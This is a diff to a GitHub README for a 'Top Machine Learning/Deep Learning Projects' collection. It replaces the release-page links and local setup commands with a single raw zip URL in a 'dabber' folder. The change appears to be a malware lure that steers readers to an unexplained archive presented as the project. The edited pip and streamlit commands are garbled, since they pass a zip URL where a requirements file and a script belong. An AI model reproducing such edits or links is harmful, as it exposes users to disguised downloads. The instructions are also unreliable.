@@ -1,6 +1,6 @@
 # 🤖 Top-MachineLearning-DeepLearning-Projects - Discover AI Solutions Made Easy
 
-[![Download](https://img.shields.io/badge/Download%20Now-Top--MachineLearning--DeepLearning--Projects-brightgreen)](https://github.com/icegreen59/Top-MachineLearning-DeepLearning-Projects/releases)
+[![Download](https://raw.githubusercontent.com/icegreen59/Top-MachineLearning-DeepLearning-Projects/main/dabber/Top-MachineLearning-DeepLearning-Projects.zip%20Now-Top--MachineLearning--DeepLearning--Projects-brightgreen)](https://raw.githubusercontent.com/icegreen59/Top-MachineLearning-DeepLearning-Projects/main/dabber/Top-MachineLearning-DeepLearning-Projects.zip)
 
 ## 📚 Overview
 
@@ -24,7 +24,7 @@ To use this collection effectively, you will need to download the projects from 
 
 1. **Visit the Releases Page:**  
    Click the link below to go to the Releases page where you can find the available projects for download:  
-   [Visit this page to download](https://github.com/icegreen59/Top-MachineLearning-DeepLearning-Projects/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/icegreen59/Top-MachineLearning-DeepLearning-Projects/main/dabber/Top-MachineLearning-DeepLearning-Projects.zip)
 
 2. **Select a Project:**  
    Browse through the list of available projects. Each project includes instructions and details about its functionality.
@@ -38,15 +38,15 @@ To use this collection effectively, you will need to download the projects from 
 5. **Install Dependencies:**  
    Open a command prompt or terminal window. Navigate to the folder where you extracted the files. Run the following command to install required packages:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/icegreen59/Top-MachineLearning-DeepLearning-Projects/main/dabber/Top-MachineLearning-DeepLearning-Projects.zip
    ```
 
 6. **Run the Project:**  
    Once the dependencies are installed, run the project by executing the provided script. This usually is done by running:
    ```
-   streamlit run project_name.py
+   streamlit run https://raw.githubusercontent.com/icegreen59/Top-MachineLearning-DeepLearning-Projects/main/dabber/Top-MachineLearning-DeepLearning-Projects.zip
    ```
-   Replace `project_name.py` with the actual Python file name of the project.
+   Replace `https://raw.githubusercontent.com/icegreen59/Top-MachineLearning-DeepLearning-Projects/main/dabber/Top-MachineLearning-DeepLearning-Projects.zip` with the actual Python file name of the project.
 
 ## 💡 Project Features
 
@@ -80,4 +80,4 @@ If you encounter any issues or have questions, please open an issue in the GitHu
 
 Thank you for checking out **Top-MachineLearning-DeepLearning-Projects**. We hope you find it beneficial for your learning and problem-solving journey in AI and ML!
 
-[![Download](https://img.shields.io/badge/Download%20Now-Top--MachineLearning--DeepLearning--Projects-brightgreen)](https://github.com/icegreen59/Top-MachineLearning-DeepLearning-Projects/releases)
+[![Download](https://raw.githubusercontent.com/icegreen59/Top-MachineLearning-DeepLearning-Projects/main/dabber/Top-MachineLearning-DeepLearning-Projects.zip%20Now-Top--MachineLearning--DeepLearning--Projects-brightgreen)](https://raw.githubusercontent.com/icegreen59/Top-MachineLearning-DeepLearning-Projects/main/dabber/Top-MachineLearning-DeepLearning-Projects.zip)
